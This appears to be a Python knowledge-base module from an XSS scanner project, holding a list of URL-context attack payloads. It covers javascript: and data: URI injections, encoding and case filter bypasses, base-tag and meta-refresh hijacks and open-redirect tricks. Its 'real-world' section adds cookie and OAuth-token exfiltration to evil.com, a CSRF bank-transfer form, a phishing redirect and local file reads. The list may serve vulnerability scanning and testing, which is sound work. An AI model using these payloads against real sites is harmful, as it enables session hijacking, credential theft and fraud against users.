#!/usr/bin/env python3

"""
Project: BRS-XSS
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-10-10 17:31:53 UTC+3
Status: Refactored
Telegram: https://t.me/easyprotech

URL/URI Context - Attack Vectors
"""

ATTACK_VECTOR = """
JAVASCRIPT PROTOCOL ATTACKS:

1. BASIC JAVASCRIPT PROTOCOL:
   <a href="javascript:alert(1)">Click</a>
   <a href="javascript:alert(document.cookie)">Click</a>
   <a href="javascript:fetch('//evil.com?c='+document.cookie)">Click</a>

2. JAVASCRIPT WITH VOID:
   javascript:void(alert(1))
   javascript:void(document.location='//evil.com')

3. JAVASCRIPT IN IMG/IFRAME:
   <img src="javascript:alert(1)">  (Blocked in modern browsers)
   <iframe src="javascript:alert(1)">

4. JAVASCRIPT WITH COMMENTS:
   javascript:/*comment*/alert(1)
   javascript://comment%0Aalert(1)

DATA URI ATTACKS:

5. DATA URI WITH HTML:
   data:text/html,<script>alert(1)</script>
   data:text/html,<img src=x onerror=alert(1)>
   data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

6. DATA URI IN IFRAME:
   <iframe src="data:text/html,<script>alert(1)</script>"></iframe>

7. DATA URI WITH CHARSET:
   data:text/html;charset=utf-7,+ADw-script+AD4-alert(1)+ADw-/script+AD4-

8. DATA URI IN IMG (Limited):
   data:image/svg+xml,<svg onload=alert(1)>
   data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+

ENCODING BYPASSES:

9. URL ENCODING:
   javascript:%61lert(1)  (%61 = 'a')
   javascript:al%65rt(1)  (%65 = 'e')
   javascript:%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29

10. DOUBLE URL ENCODING:
    javascript:%2561lert(1)  (%25 = '%', then %61 = 'a')

11. UNICODE ENCODING:
    javascript:\\u0061lert(1)
    javascript:al\\u0065rt(1)

12. HEX ENCODING:
    javascript:\\x61lert(1)
    javascript:al\\x65rt(1)

13. MIXED ENCODING:
    javascript:%61l\\u0065rt(1)
    j%61v%61script:alert(1)

CASE VARIATION BYPASSES:

14. MIXED CASE:
    JaVaScRiPt:alert(1)
    jAvAsCrIpT:alert(1)
    JAVASCRIPT:alert(1)

15. CASE WITH ENCODING:
    JaVaScRiPt:%61lert(1)
    j%61vaScRiPt:alert(1)

WHITESPACE AND SPECIAL CHARACTERS:

16. TAB CHARACTER:
    java\\tscript:alert(1)
    jav&#x09;ascript:alert(1)
    jav%09ascript:alert(1)

17. NEWLINE CHARACTER:
    java\\nscript:alert(1)
    jav&#x0A;ascript:alert(1)
    jav%0Aascript:alert(1)

18. CARRIAGE RETURN:
    java\\rscript:alert(1)
    jav&#x0D;ascript:alert(1)
    jav%0Dascript:alert(1)

19. NULL BYTE:
    javascript\\x00:alert(1)
    java\\0script:alert(1)

20. MULTIPLE WHITESPACE:
    java   script:alert(1)
    java\\t\\n\\rscript:alert(1)

ALTERNATIVE PROTOCOLS:

21. VBSCRIPT (IE):
    vbscript:msgbox(1)
    vbscript:Execute("msgbox 1")

22. FILE PROTOCOL:
    file:///etc/passwd  (Local file access)
    file://\\\\attacker.com\\share\\file  (UNC path)

23. ABOUT PROTOCOL:
    about:blank  (Can be manipulated with DOM)

24. BLOB PROTOCOL:
    blob:https://example.com/uuid  (If attacker controls blob)

25. MS-OFFICE PROTOCOLS:
    ms-word:ofe|u|https://attacker.com/doc.docx
    ms-excel:ofe|u|https://attacker.com/sheet.xlsx
    ms-powerpoint:ofe|u|https://attacker.com/pres.pptx

26. CUSTOM APP PROTOCOLS:
    skype:user?call
    facetime:phone-number
    tel:+1234567890
    sms:+1234567890
    mailto:victim@example.com
    geo:0,0
    spotify:track:id
    slack://open
    zoommtg://zoom.us/join?confno=123
    steam://install/123
    discord://discord.com/channels/123

27. PROPRIETARY PROTOCOLS:
    ms-settings:  (Windows settings)
    ms-calculator:  (Launch calculator)
    ms-availablenetworks:  (Network settings)

FORM ACTION HIJACKING:

28. FORM ACTION WITH JAVASCRIPT:
    <form action="javascript:alert(1)">

29. FORMACTION ATTRIBUTE:
    <button formaction="javascript:alert(1)">Submit</button>
    <input type="submit" formaction="javascript:alert(1)">

30. FORM WITH DATA URI:
    <form action="data:text/html,<script>alert(1)</script>">

BASE TAG ATTACKS:

31. BASE HREF HIJACKING:
    <base href="https://attacker.com/">
    (All relative URLs now point to attacker's domain)

32. BASE WITH JAVASCRIPT:
    <base href="javascript:alert(1)">  (Blocked in modern browsers)

META REFRESH ATTACKS:

33. META REFRESH WITH JAVASCRIPT:
    <meta http-equiv="refresh" content="0;url=javascript:alert(1)">

34. META REFRESH WITH DATA:
    <meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1)</script>">

35. META REFRESH TO PHISHING:
    <meta http-equiv="refresh" content="0;url=https://evil.com/phish">

REDIRECT PARAMETER EXPLOITATION:

36. OPEN REDIRECT TO XSS:
    ?redirect=javascript:alert(1)
    ?url=data:text/html,<script>alert(1)</script>
    ?next=//evil.com

37. DOUBLE SLASH TRICK:
    //evil.com
    ///evil.com
    ////evil.com
    (Becomes protocol-relative URL)

38. BACKSLASH CONFUSION:
    https://trusted.com\\@evil.com
    https://trusted.com\\\\evil.com

39. @ SYMBOL ABUSE:
    https://trusted.com@evil.com
    https://user:pass@evil.com

40. URL PARAMETER POLLUTION:
    https://trusted.com?url=https://trusted.com&url=https://evil.com

SVG AND XML:

41. SVG WITH XLINK:
    <svg><use xlink:href="data:image/svg+xml,<svg id=x onload=alert(1)>"></use></svg>

42. SVG WITH SCRIPT:
    <svg><script xlink:href="https://evil.com/xss.js"></script></svg>

43. XML WITH ENTITY:
    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'%3E">

CSS URL() IN HREF:

44. CSS IMPORT IN DATA URI:
    data:text/html,<style>@import 'https://evil.com/evil.css';</style>

45. BACKGROUND URL:
    data:text/html,<div style="background:url('https://evil.com/track')">

IFRAME SANDBOX BYPASS:

46. IFRAME WITH ALLOW-SCRIPTS:
    <iframe sandbox="allow-scripts" src="data:text/html,<script>alert(1)</script>">

47. IFRAME SRCDOC:
    <iframe srcdoc="<script>alert(1)</script>">

LINK PREFETCH/PRERENDER:

48. LINK PREFETCH:
    <link rel="prefetch" href="https://evil.com/track">

49. LINK PRERENDER:
    <link rel="prerender" href="https://evil.com/page">

50. DNS PREFETCH:
    <link rel="dns-prefetch" href="//evil.com">

FILTER BYPASS TECHNIQUES:

51. COMMENTS IN PROTOCOL:
    java/*comment*/script:alert(1)

52. HTML ENTITIES:
    &#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)
    javascript&#58;alert(1)  (&#58; = ':')

53. UNICODE NORMALIZATION:
    \\u0001javascript:alert(1)  (Zero-width character)

54. OVERLONG UTF-8:
    Exploit UTF-8 parsing differences

55. URL WITH CREDENTIALS:
    https://user:javascript:alert(1)@trusted.com

REAL-WORLD ATTACK SCENARIOS:

OAUTH CALLBACK HIJACKING:
?redirect_uri=javascript:fetch('//evil.com?token='+location.hash)
?callback=https://evil.com/steal?

PHISHING VIA OPEN REDIRECT:
<a href="?redirect=https://trusted-site.com.evil.com/login">
Click here to verify your account
</a>

SESSION HIJACKING:
<a href="javascript:fetch('//evil.com/steal?c='+document.cookie)">
Download Receipt
</a>

CSRF VIA FORM ACTION:
<form action="https://bank.com/transfer">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
  <button>Claim your prize!</button>
</form>

FILE PROTOCOL ATTACKS:
<iframe src="file:///etc/passwd">
<iframe src="file://\\\\attacker.com\\share\\file">

MOBILE APP DEEP LINK EXPLOITATION:
myapp://open?url=javascript:alert(1)
myapp://webview?url=data:text/html,<script>alert(1)</script>

PROTOCOL HANDLER REGISTRATION:
navigator.registerProtocolHandler(
  'web+xss',
  'https://evil.com/?uri=%s',
  'XSS Handler'
);
"""

